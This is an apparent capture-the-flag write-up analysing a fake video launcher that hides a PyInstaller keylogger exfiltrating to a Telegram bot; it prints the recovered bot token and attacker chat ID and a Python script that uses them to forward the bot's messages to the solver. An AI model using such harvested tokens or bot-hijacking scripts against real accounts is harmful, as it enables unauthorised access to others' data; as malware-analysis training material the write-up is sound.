# VideoLauncher

## Solve
DiE shows `VideoLauncher.exe` as rar:

<img width="852" height="366" alt="image" src="https://github.com/user-attachments/assets/a50af084-8c5d-438b-a64e-f6324338dff7" />

Rename it to .rar, extract files:

<img width="373" height="130" alt="image" src="https://github.com/user-attachments/assets/a7a89230-e6f0-416c-9d11-9e2894ee9b26" />

Video is most likely a dummy, we look at the binary again in DiE:

<img width="812" height="336" alt="image" src="https://github.com/user-attachments/assets/99c35f85-60cb-4dac-91aa-9a8ea54d4b57" />

Pyinstxtractor the .exe, pylingual the `keylog.pyc`:

<img width="1020" height="437" alt="image" src="https://github.com/user-attachments/assets/f6694ccc-6e15-46f0-b5db-14def82ea53b" />

<img width="222" height="50" alt="image" src="https://github.com/user-attachments/assets/2ad1b19d-80fc-48b4-aec6-edd600c5ab11" />

See encrypted Telegram Bot payload:

<img width="1050" height="414" alt="image" src="https://github.com/user-attachments/assets/23eb9a13-ba4b-4e31-90e7-9387ae9e8c63" />

Craft a script to find telegram bot name:
```python
import requests

BOT   = "8730354227:AAGNzcTfCMxNG-w_FDO-rZkqDyVeLMLK4l4"
ATTACKER_CHAT = "1421332625"  # lalalala3215's chat
base  = f"https://api.telegram.org/bot{BOT}"

# Find bot name
print(requests.get(f"{base}/getMe").json())

# Manually message the bot to get a chat_id
updates = requests.get(f"{base}/getUpdates").json()
print(updates)
MY_CHAT_ID = updates["result"][0]["message"]["chat"]["id"]  

for msg_id in range(1, 200):
    r = requests.get(f"{base}/forwardMessage", params={
        "chat_id": MY_CHAT_ID,
        "from_chat_id": ATTACKER_CHAT,
        "message_id": msg_id
    }).json()
    if r.get("ok"):
        print(f"✓ Forwarded message {msg_id}: {r}")
    else:
        print(f"✗ {msg_id}: {r['description']}")
```

I had to run this twice since the first time I had to get the `chat_id` first before plugging it into the script and ran it a second time to forward messages to the attacker’s chat to myself:

<img width="389" height="483" alt="image" src="https://github.com/user-attachments/assets/39bda622-0ff1-4285-9689-9c315427eeff" />

`Flag = UMCS{sFx_KeY1o0Gg3R_T3l3gRam_B0t}`
